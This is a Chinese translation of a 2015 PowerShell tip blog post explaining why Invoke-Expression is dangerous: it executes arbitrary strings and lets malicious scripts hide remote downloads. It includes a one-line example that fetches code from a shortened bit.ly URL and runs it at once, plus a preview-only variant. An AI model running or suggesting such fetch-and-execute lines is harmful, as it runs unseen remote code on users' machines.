layout: post
date: 2015-09-17 11:00:00
title: "PowerShell 技能连载 - 为什么 Invoke-Expression 是邪恶的"
description: PowerTip of the Day - Why Invoke-Expression is Evil
categories:
- powershell
- tip
tags:
- powershell
- tip
- powertip
- series
- translation
---
`Invoke-Expression` 接受任何字符串输入并将它视为 PowerShell 代码。通过这种方式，您可以动态地创建代码，并执行它。

`Invoke-Expression` 是一个非常危险的命令，因为不仅您可以创建动态的代码。恶意的脚本可以隐藏它的邪恶目的，例如通过 web 站点下载代码。

以下是一个安全并有趣的例子，演示了如何从下载到执行一段代码：

    #requires -Version 3
    
    Invoke-Expression -Command (Invoke-WebRequest -Uri 'http://bit.ly/e0Mw9w' -UseBasicParsing).Content

如果您不希望发生意外，这行代码可以帮您预览将会发生什么。请在 PowerShell ISE 中运行这段代码。它将显示从 internet 下载的 PowerShell 代码，而不是立即执行它：

    #requires -Version 3
    
    $file = $psise.CurrentPowerShellTab.Files.Add()
    
    $file.Editor.text = (Invoke-WebRequest -Uri 'http://bit.ly/e0Mw9w' -UseBasicParsing).Content

<!--more-->
本文国际来源：[Why Invoke-Expression is Evil](http://community.idera.com/powershell/powertips/b/tips/posts/why-invoke-expression-is-evil)
